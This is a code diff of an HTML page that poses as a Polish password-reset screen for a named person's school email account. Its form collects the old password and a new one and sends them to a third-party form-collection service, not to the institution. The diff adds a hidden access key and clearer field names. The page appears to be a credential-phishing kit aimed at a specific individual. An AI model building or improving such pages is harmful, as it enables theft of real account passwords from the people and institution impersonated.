@@ -117,13 +117,14 @@
         <div class="email">Mateusz.dabrowski@zse.krakow.pl</div>
         <h1>Resetowanie hasła</h1>
         <p>Co najmniej 8 znaków; uwzględniana jest wielkość liter</p>
-        <form method="POST" action=https://getform.io/f/jawxoqlb>
-            <input type="password" name="name"  placeholder="Stare hasło">
-            <input type="password" name="email" placeholder="Nowe hasło">
-            <input type="password" name="confirm" placeholder="Ponownie wprowadź nowe hasło">
+        <form action="https://getform.io/f/jawxoqlb" method="POST">
+            <input type="hidden" name="access_key" value="2d2eb06a-6f7d-425f-abda-c2fff9741e7c">
+            <input type="password" name="old-password"  placeholder="Stare hasło">
+            <input type="password" name="new-password" placeholder="Nowe hasło">
+            <input type="password" name="confirm-password" placeholder="Ponownie wprowadź nowe hasło">
             <div class="buttons">
                 <button type="button" class="cancel">Anuluj</button>
-                <button type="submit" class="next"">Dalej</button>
+                <button type="submit" class="next">Dalej</button>
             </div>
         </form>
     </div>
